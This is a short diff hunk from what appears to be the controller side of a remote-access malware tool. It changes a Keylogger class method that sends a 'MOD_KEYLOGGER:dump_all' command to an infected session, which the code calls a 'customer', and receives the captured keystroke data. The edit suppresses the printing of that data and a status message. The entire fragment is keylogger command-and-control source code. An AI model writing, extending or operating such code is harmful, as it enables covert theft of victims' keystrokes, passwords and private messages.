@@ -85,8 +85,8 @@ class Keylogger:
     
     def dumpAllData(self):
         if(CheckConn().sendsafe(self.session_nb , Handler.dict_conn[self.session_nb][NB_SOCKET], "MOD_KEYLOGGER:dump_all")):
-            print(CheckConn().recvcommand(Handler.dict_conn[self.session_nb][NB_SOCKET],4096))
-            printColor("successfully", "[+] The mod has been sent.")
+            CheckConn().recvcommand(Handler.dict_conn[self.session_nb][NB_SOCKET],4096)
+            #printColor("successfully", "[+] The mod has been sent.")
         else:
             printColor("error", "[-] Unable to send the KEYLOGER MOD to the customer.\n")
 
